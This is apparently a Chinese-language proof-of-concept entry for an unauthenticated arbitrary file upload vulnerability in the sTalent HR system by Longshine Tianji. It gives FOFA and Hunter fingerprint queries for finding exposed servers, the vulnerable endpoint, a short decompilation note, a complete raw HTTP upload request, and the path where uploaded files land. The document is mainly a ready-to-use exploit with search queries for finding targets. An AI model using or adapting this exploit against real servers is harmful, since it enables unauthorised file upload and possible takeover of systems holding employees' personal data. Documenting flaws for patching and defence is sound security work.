---
title: 朗新天霁sTalent任意文件上传
---

# 朗新天霁sTalent前台任意文件上传

## 漏洞厂商

北京朗新天霁软件技术有限公司

## 厂商官网

http://www.hrsoft.com.cn/  

## 产品

sTalent系统

## 指纹

**FOFA**

```
"/js/Comm/loadingsmall.js" && icon_hash="1772087922"
```

**Hunter**

```
web.body="/js/Comm/loadingsmall.js" && web.icon=="4859e39ae6c0f1f428f2126a6bb32bd9"
```

漏洞地址:`/api/Report/SaveNewReport`

漏洞分析:

在`Web.Api.dll`文件中进行反混淆，得到源代码。程序采用MVC结构

`Web.Api.Controllers.Report`类下的`SaveNewReport`存在文件上传漏洞

由于存在鉴权，需要方法添加注释

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624183117550.png)

这里满足，并且在`httpPostedFile`对象后调用了`SaveAs`方法

存储路径在`/report\\newReportFiles`下

## POC

```
POST /api/Report/SaveNewReport?rptId=1 HTTP/1.1
Host: x.x.x.x
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: ASP.NET_SessionId=qreedyvzmub5afo1nba2i22d
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryxzpiOaIdFLPXG0zW
Content-Length: 177 

------WebKitFormBoundaryxzpiOaIdFLPXG0zW
Content-Disposition: form-data; name="file";filename="1.txt"
Content-Type: image

111
------WebKitFormBoundaryxzpiOaIdFLPXG0zW—
```

文件路径:

`/report/newReportFiles/1_1.txt`

`report/newReportFiles/{rptId}_filename`

新版本路径在:`/api/Report/Report/SaveNewReport`

![](https://ckcsec.oss-cn-hangzhou.aliyuncs.com/img/image-20240624183400986.png)
